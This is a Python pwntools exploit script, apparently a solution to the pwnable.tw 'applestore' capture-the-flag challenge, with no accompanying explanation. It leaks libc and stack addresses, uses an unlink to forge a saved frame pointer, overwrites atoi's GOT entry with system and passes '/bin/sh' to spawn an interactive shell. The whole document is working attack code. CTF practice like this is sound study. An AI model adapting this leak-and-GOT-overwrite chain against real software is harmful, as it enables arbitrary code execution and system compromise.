from pwn import *
libc = ELF('./libc_32.so.6')
system_off = libc.symbols['system']
environ_off = libc.symbols['environ']

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def list_item():
    s.send("1\n")
    print(s.recvuntil("> "))

def add(i):
    s.send("2\n")
    s.recvuntil("> ")
    s.send(str(i)+"\n")
    s.recvuntil("> ")

def delete(i):
    s.send("3\n")
    s.recv(1024)
    s.send(str(i)+"\n")
    s.recv(1024)

def cart(option=0):
    s.send(p32(0x08048034)+p32(0x0804b028)+p32(0x0804b040)+"aaaabbbb\n")
    s.recv(1024)
    s.send("y\n")
    if(option==1):
        a=s.recvuntil("27: ")
        b=s.recvuntil(" $")
        c=s.recvuntil("\n")
        leak=tohex(int(c),32)

        system=int(leak,16)-0xb7de4060+0xb7df1940
        environ=system-system_off+environ_off
        print(hex(system))
        print(hex(environ))
        return(system, environ)

    else:
        s.recv(1024)

def checkout(option=0):
    s.send("5\n")
    s.recv(1024)
    s.send("y\n")
    if(option==1):
        print(s.recv(1024))
    else:
        s.recv(1024)

#s=remote("chall.pwnable.tw",10104)
s=process("./applestore",env={"LD_PRELOAD":"./libc_32.so.6"})

print(s.recvuntil("> "))
list_item()
time.sleep(1)

#Make Total=7175
for i in range(5):
    add(4)
for i in range(10):
    add(2)
for i in range(11):
    add(1)
pause()

#checkout()->link stack
checkout(1)
pause()

#leak libc
(system, environ)=cart(1)
time.sleep(1)
print("HELLO")
pause()

#leak stack(using environ)
s.send(p32(0xb7e00a34)+"aaaabbbbccccdddd\n")
s.recv(1024)
s.send("y\n"+p32(environ)+p32(0)+p32(0)+p32(0)+"aa\n")
a=s.recvuntil("27: ")
b=s.recv(1024)
print(hexdump(b))
stack_leak=u32(b[0:4])-0xbfa95ebc+0xbfa95db8
print(hex(stack_leak))
pause()

#unlink to make fake ebp(ebp: atoi@got+0x22-8)
s.send("3\n"+"\x00"*19)
s.recvuntil("> ")
s.send("27"+p32(0x08048a0a)+"bbbb"+p32(0x0804b040+0x22-8)+p32(stack_leak-8)+"ee\n")
s.recv(1024)

#overwrite atoi@got as system & give /bin/sh as a parameter of atoi
s.send("/bin/sh\x00"+p32(system)+"\n")
s.interactive()
s.close()
